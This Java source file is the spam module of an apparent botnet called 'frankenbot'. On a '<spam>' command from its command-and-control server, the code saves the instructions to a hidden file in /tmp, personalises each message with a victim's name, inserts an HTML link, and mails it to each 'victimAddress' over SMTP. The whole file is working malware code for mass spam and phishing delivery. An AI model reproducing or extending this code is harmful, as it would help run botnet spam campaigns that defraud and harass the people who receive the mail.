package ca.franky.frankenbot_bot;

import com.sun.org.apache.xpath.internal.operations.Bool;

import java.io.*;
import java.util.ArrayList;
import java.util.Iterator;

/**
 * Created by vonn on 3/25/14.
 */
public class SpamModule {
    public static void send (String replyFromCC, Mailer myMailer,
                             Boolean debug) {

        if (replyFromCC != null && replyFromCC.contains("<spam>")) {
            if (debug) System.out.println("C&C told me to spam. I am " +
                    "operating in '" + myMailer.mode + "' mode and my SMTP " +
                    "server is '" + myMailer.smtpServer + "'");

            // Write the response to a file
            Writer output = null;
            File file = new File ("/tmp/.spamlist");
            try {
                output = new BufferedWriter(new FileWriter(file));
                output.write(replyFromCC);
                output.close();
            } catch (IOException e) {
                e.printStackTrace();
            }

            // Process the response and extract the spam configuration
            // parameters for all the spam messages to be sent
            ArrayList<SpamXMLparser> mySpamConfigs = new SpamXMLparser()
                    .returnSpamConfigs("/tmp/.spamlist");
            Iterator<SpamXMLparser> itr0 = mySpamConfigs.iterator();
            /*
             * Send out spam
             */
            while (itr0.hasNext()) {
                SpamXMLparser currentSpamDetails = new SpamXMLparser();
                currentSpamDetails = itr0.next();
                /*
                 * Adjust the body if fields like -firstName,
                 * -lastName- and -link-: are found
                 */
                String adjustedBody = currentSpamDetails.emailBody
                        .replaceAll("-firstName-",
                                currentSpamDetails.victimFirstName)
                        .replaceAll("-lastName",
                                currentSpamDetails.victimLastName);

                if (adjustedBody.contains("-link-:")) {
                    String linkDetails = adjustedBody.substring(adjustedBody
                            .indexOf("-link-:")).substring(0,
                            adjustedBody.substring(adjustedBody.indexOf
                                    ("-link-:")).indexOf("")).replaceAll
                            ("-link-:", "");
                    String link = linkDetails.substring(0,
                            linkDetails.indexOf("^"));
                    String linkText = linkDetails.substring(linkDetails
                            .indexOf("^") + 1);
                    adjustedBody = adjustedBody.substring(0,
                            adjustedBody.indexOf("-link-:")) + "<A HREF=\""
                            + link + "\">" + linkText + "</A>" +
                            adjustedBody.substring(adjustedBody.indexOf
                                    ("-link-:") + linkDetails.length() + 7);
                }

                if (debug) { System.out.println("Sending spam to: " +
                        currentSpamDetails.victimAddress); }

                Mailer.sendMsg(myMailer.smtpServer, 25,
                        currentSpamDetails.emailSubject,
                        currentSpamDetails.emailFromAddress,
                        currentSpamDetails.victimAddress, adjustedBody);
            }
        }
    }
}
